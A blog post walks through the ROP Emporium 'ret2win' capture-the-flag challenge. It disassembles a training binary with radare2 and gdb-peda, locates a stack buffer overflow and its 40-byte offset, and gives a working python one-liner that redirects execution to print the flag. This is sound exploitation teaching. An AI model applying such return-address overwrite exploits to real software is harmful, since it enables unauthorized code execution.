---
layout:     post
title:      'ROP Emporium - ret2win'
date:       2019-01-23 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

Today we're going to walk through a first challenge from the [ROP Emporium](https://ropemporium.com/), website which contains a series of challenges designed to teach about [Return Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming). It's an exploitation technique that is used to bypass security measures in binary that disallow us to place and execute shellcode in memory during the usual buffer overflow. 

For example, when [W^X](https://en.wikipedia.org/wiki/W%5EX) policy is present, pages in operating system can only be writeable or executable but not both, hence the name Writable Xor Executable. On the other hand we have [DEP](https://en.wikipedia.org/wiki/Executable_space_protection) (data execution prevention), which will mark memory regions as non executable through, for example, [NX](https://en.wikipedia.org/wiki/NX_bit) bit (no execution bit) implented directly by hardware. 

Coming back to the tasks, our main goal is, as in other CTF challenges, to read the flag using the binary that we are provided. 

As today the challenge will be introductionary one, we're not going to do anything fancy. Quite the opposite, but let's start from the beginning. 

Our binary is usual ELF executable in 64-bit architecture. You can try out both 32-bit and 64-bit versions of this challenge as they are both present to download. 

```text
[w3ndige@main ret2win]$ file ret2win 
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a871295b6234edb261710bcc73a8c03e3c0f601d, not stripped
```

We can start analyzing it with `radare2`, starting out with getting a hold of the functions inside this binary and their purpose. 

```text
[w3ndige@main ret2win]$ r2 -AAA ./ret2win 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- r2 is a great OS, but a terrible hex editor
[0x00400650]> i~nx
nx       true
```

With command `i~nx` we can see that the NX bit is set, so our stack is non-executable. 

During the examinations of functions shown with `afl` command, we can see three potentialy be useful in this attack.

```text
[0x00400650]> afl
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start_400640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    4 58   -> 55   sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry.init0
0x00400746    1 111          sym.main
0x004007b5    1 92           sym.pwnme
0x00400811    1 32           sym.ret2win
0x00400840    4 101          sym.__libc_csu_init
0x004008b0    1 2            sym.__libc_csu_fini
0x004008b4    1 9            sym._fini
```

That is, `main`, `pwnme` and `ret2win`. To better undestarnd the flow of the program let's start by disassembling the first function `main` with `pdf` command.

```text
[0x00400650]> pdf @main
            ;-- main:
/ (fcn) sym.main 111
|   sym.main (int argc, char **argv, char **envp);
|           ; DATA XREF from entry0 (0x40066d)
|           0x00400746      55             push rbp
|           0x00400747      4889e5         mov rbp, rsp
|           0x0040074a      488b050f0920.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; obj.__TMC_END ; [0x601060:8]=0
|           0x00400751      b900000000     mov ecx, 0
|           0x00400756      ba02000000     mov edx, 2
|           0x0040075b      be00000000     mov esi, 0
|           0x00400760      4889c7         mov rdi, rax
|           0x00400763      e8c8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00400768      488b05110920.  mov rax, qword [obj.stderr__GLIBC_2.2.5] ; [0x601080:8]=0
|           0x0040076f      b900000000     mov ecx, 0
|           0x00400774      ba02000000     mov edx, 2
|           0x00400779      be00000000     mov esi, 0
|           0x0040077e      4889c7         mov rdi, rax
|           0x00400781      e8aafeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00400786      bfc8084000     mov edi, str.ret2win_by_ROP_Emporium ; 0x4008c8 ; "ret2win by ROP Emporium"
|           0x0040078b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400790      bfe0084000     mov edi, str.64bits         ; 0x4008e0 ; "64bits\n"
|           0x00400795      e836feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040079a      b800000000     mov eax, 0
|           0x0040079f      e811000000     call sym.pwnme
|           0x004007a4      bfe8084000     mov edi, str.Exiting        ; 0x4008e8 ; "\nExiting"
|           0x004007a9      e822feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007ae      b800000000     mov eax, 0
|           0x004007b3      5d             pop rbp
\           0x004007b4      c3             ret
```

We can see that it's main purpose is to print out some information and then at address `0x0040079f` call the `pwnme`. Let's move our disassembly to that function.

```text
[0x00400650]> pdf @main
            ;-- main:
/ (fcn) sym.main 111
|   sym.main (int argc, char **argv, char **envp);
|           ; DATA XREF from entry0 (0x40066d)
|           0x00400746      55             push rbp
|           0x00400747      4889e5         mov rbp, rsp
|           0x0040074a      488b050f0920.  mov rax, qword [obj.stdout__GLIBC_2.2.5] ; obj.__TMC_END ; [0x601060:8]=0
|           0x00400751      b900000000     mov ecx, 0
|           0x00400756      ba02000000     mov edx, 2
|           0x0040075b      be00000000     mov esi, 0
|           0x00400760      4889c7         mov rdi, rax
|           0x00400763      e8c8feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00400768      488b05110920.  mov rax, qword [obj.stderr__GLIBC_2.2.5] ; [0x601080:8]=0
|           0x0040076f      b900000000     mov ecx, 0
|           0x00400774      ba02000000     mov edx, 2
|           0x00400779      be00000000     mov esi, 0
|           0x0040077e      4889c7         mov rdi, rax
|           0x00400781      e8aafeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00400786      bfc8084000     mov edi, str.ret2win_by_ROP_Emporium ; 0x4008c8 ; "ret2win by ROP Emporium"
|           0x0040078b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x00400790      bfe0084000     mov edi, str.64bits         ; 0x4008e0 ; "64bits\n"
|           0x00400795      e836feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040079a      b800000000     mov eax, 0
|           0x0040079f      e811000000     call sym.pwnme
|           0x004007a4      bfe8084000     mov edi, str.Exiting        ; 0x4008e8 ; "\nExiting"
|           0x004007a9      e822feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007ae      b800000000     mov eax, 0
|           0x004007b3      5d             pop rbp
\           0x004007b4      c3             ret
[0x00400650]> pdf @sym.pwnme
/ (fcn) sym.pwnme 92
|   sym.pwnme ();
|           ; var int local_20h @ rbp-0x20
|           ; CALL XREF from sym.main (0x40079f)
|           0x004007b5      55             push rbp
|           0x004007b6      4889e5         mov rbp, rsp
|           0x004007b9      4883ec20       sub rsp, 0x20
|           0x004007bd      488d45e0       lea rax, qword [local_20h]
|           0x004007c1      ba20000000     mov edx, 0x20               ; 32
|           0x004007c6      be00000000     mov esi, 0
|           0x004007cb      4889c7         mov rdi, rax
|           0x004007ce      e82dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x004007d3      bff8084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong ; 0x4008f8 ; "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?"
|           0x004007d8      e8f3fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007dd      bf78094000     mov edi, str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets ; 0x400978 ; "You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"
|           0x004007e2      e8e9fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x004007e7      bfdd094000     mov edi, 0x4009dd
|           0x004007ec      b800000000     mov eax, 0
|           0x004007f1      e8fafdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x004007f6      488b15730820.  mov rdx, qword [obj.stdin__GLIBC_2.2.5] ; [0x601070:8]=0
|           0x004007fd      488d45e0       lea rax, qword [local_20h]
|           0x00400801      be32000000     mov esi, 0x32               ; '2' ; 50
|           0x00400806      4889c7         mov rdi, rax
|           0x00400809      e812feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0040080e      90             nop
|           0x0040080f      c9             leave
\           0x00400810      c3             ret
```

Now that's where a lof of things are happening. Firstly we can see that there is a buffer of **0x20** (32) bytes in size, that at the start of the function is getting zeroed out with memset at address `0x004007ce`. Then there is information printed out by the program. Lastly, we have `fgets` function that will get **50** bytes from standard input into the buffer. 

But **50** bytes is much larger than our **32** byte buffer. Here's when normal buffer overflow scenario comes in, together with `gdb` that will help us debug the binary while running. 

Let's start this program with **50** byte input and see what will happen. 

```text
gdb-peda$ r
Starting program: /home/w3ndige/hacking/rop_emporium/ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdd30 ('A' <repeats 49 times>)
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x7fffffffdd30 ('A' <repeats 49 times>)
RSI: 0x7ffff7f93730 --> 0x0 
RDI: 0x7fffffffdd31 ('A' <repeats 48 times>)
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdd58 ("AAAAAAAAA")
RIP: 0x400810 (<pwnme+91>:	ret)
R8 : 0x0 
R9 : 0x7ffff7f93720 --> 0x0 
R10: 0x7ffff7f98500 (0x00007ffff7f98500)
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde40 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>:	call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>:	nop
   0x40080f <pwnme+90>:	leave  
=> 0x400810 <pwnme+91>:	ret    
   0x400811 <ret2win>:	push   rbp
   0x400812 <ret2win+1>:	mov    rbp,rsp
   0x400815 <ret2win+4>:	mov    edi,0x4009e0
   0x40081a <ret2win+9>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd58 ("AAAAAAAAA")
0008| 0x7fffffffdd60 --> 0x400041 --> 0x4000000005000000 
0016| 0x7fffffffdd68 --> 0x7ffff7df7223 (<__libc_start_main+243>:	mov    edi,eax)
0024| 0x7fffffffdd70 --> 0x0 
0032| 0x7fffffffdd78 --> 0x7fffffffde48 --> 0x7fffffffe1b4 ("/home/w3ndige/hacking/rop_emporium/ret2win/ret2win")
0040| 0x7fffffffdd80 --> 0x100000000 
0048| 0x7fffffffdd88 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffdd90 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
```

We can see that that input caused segmentation fault. But as I'm using `peda` extension to `gdb`, I decided to check out patterns, that I recently learned about. 

We can create a pattern and save it as input, then feed it into the binary and lastly check how this pattern behaved and at which characters our application crashed. Peda is even smart enough to analyze it for us. 

```text
gdb-peda$ pattern_create 50 input
Writing pattern of 50 chars to filename "input"
```

With this command, we have created a pattern of 50 characters names as input. 

```text
gdb-peda$ r < input
Starting program: /home/w3ndige/hacking/rop_emporium/ret2win/ret2win < input
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> 
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdd30 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBX: 0x0 
RCX: 0xfbad2088 
RDX: 0x7fffffffdd30 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RSI: 0x7ffff7f93730 --> 0x0 
RDI: 0x7fffffffdd31 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdd58 ("AA0AAFAAb")
RIP: 0x400810 (<pwnme+91>:	ret)
R8 : 0x0 
R9 : 0x77 ('w')
R10: 0x602010 --> 0x0 
R11: 0x246 
R12: 0x400650 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde40 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400809 <pwnme+84>:	call   0x400620 <fgets@plt>
   0x40080e <pwnme+89>:	nop
   0x40080f <pwnme+90>:	leave  
=> 0x400810 <pwnme+91>:	ret    
   0x400811 <ret2win>:	push   rbp
   0x400812 <ret2win+1>:	mov    rbp,rsp
   0x400815 <ret2win+4>:	mov    edi,0x4009e0
   0x40081a <ret2win+9>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd58 ("AA0AAFAAb")
0008| 0x7fffffffdd60 --> 0x400062 --> 0x1f8000000000000 
0016| 0x7fffffffdd68 --> 0x7ffff7df7223 (<__libc_start_main+243>:	mov    edi,eax)
0024| 0x7fffffffdd70 --> 0x0 
0032| 0x7fffffffdd78 --> 0x7fffffffde48 --> 0x7fffffffe1b4 ("/home/w3ndige/hacking/rop_emporium/ret2win/ret2win")
0040| 0x7fffffffdd80 --> 0x100000000 
0048| 0x7fffffffdd88 --> 0x400746 (<main>:	push   rbp)
0056| 0x7fffffffdd90 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
RBP+0 found at offset: 32
Registers point to pattern buffer:
[RAX] --> offset 0 - size ~49
[RDX] --> offset 0 - size ~49
[RDI] --> offset 1 - size ~48
[RSP] --> offset 40 - size ~9
Pattern buffer found at:
0x00602260 : offset    0 - size   50 ([heap])
0x00007fffffffdd30 : offset    0 - size   49 ($sp + -0x28 [-10 dwords])
References to pattern buffer found at:
0x00007ffff7f91878 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f91880 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f91888 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f91890 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007ffff7f91898 : 0x00602260 (/usr/lib/libc-2.28.so)
0x00007fffffffb120 : 0x00007fffffffdd30 ($sp + -0x2c38 [-2830 dwords])
0x00007fffffffd980 : 0x00007fffffffdd30 ($sp + -0x3d8 [-246 dwords])
0x00007fffffffd9a0 : 0x00007fffffffdd30 ($sp + -0x3b8 [-238 dwords])
0x00007fffffffdca0 : 0x00007fffffffdd30 ($sp + -0xb8 [-46 dwords])
0x00007fffffffdcb8 : 0x00007fffffffdd30 ($sp + -0xa0 [-40 dwords])
0x00007fffffffdce8 : 0x00007fffffffdd30 ($sp + -0x70 [-28 dwords])
```

Now, we can see that binary once again crashed, but by doing `pattern_search` we get the exact offset that will cause us to overwrite the `rsp` - 40 which means 40 bytes.

As the `rsp` before `ret` contains the value pushed as the return address at the start of the funciton, by overwriting it with any address we want, we can return to anywhere in the code. 

Let's come back to `radare2` and find if there's anywhere we want to jump. And of course, in `ret2win` function we have `/bin/cat flag.txt` command. 

```text
[0x00400650]> pdf @sym.ret2win
/ (fcn) sym.ret2win 32
|   sym.ret2win ();
|           0x00400811      55             push rbp
|           0x00400812      4889e5         mov rbp, rsp
|           0x00400815      bfe0094000     mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:"
|           0x0040081a      b800000000     mov eax, 0
|           0x0040081f      e8ccfdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400824      bffd094000     mov edi, str.bin_cat_flag.txt ; 0x4009fd ; "/bin/cat flag.txt"
|           0x00400829      e8b2fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0040082e      90             nop
|           0x0040082f      5d             pop rbp
\           0x00400830      c3             ret
```

Address of this function is `0x00400811`, so we have to have **40** bytes of garbage and then our 64-bit address. Remember that address should be in little endian!

Our final exploit will look like this. 

```text
[w3ndige@main ret2win]$ python -c 'print("A" * 40  + "\x11\x08\x40\x00\x00\x00\x00\x00")' | ./ret2win
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

And here we have the flag!

